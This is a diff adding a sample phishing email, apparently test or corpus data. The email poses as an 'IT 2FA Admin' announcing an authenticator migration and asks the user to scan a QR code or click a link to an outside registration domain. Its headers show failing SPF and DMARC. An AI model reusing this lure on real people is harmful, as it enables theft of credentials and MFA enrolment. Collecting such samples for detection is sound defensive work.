@@ -1,0 +1,8 @@
+Authentication-Results: spf=fail; dkim=none; dmarc=fail
+From: "IT 2FA Admin" <mfa@mfa-qr-update.com>
+To: user@enterprise.com
+Subject: Action Required: Authenticator App 2FA Migration
+Date: Mon, 16 Sep 2026 19:00:00 +0000
+Content-Type: text/html; charset="UTF-8"
+
+<html><body><p>Scan this QR code with your mobile camera to register your multi-factor token:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" alt="QR Code"></p><p><a href="http://mfa-mobile-registration.com/auth">Or click here to verify</a></p></body></html>
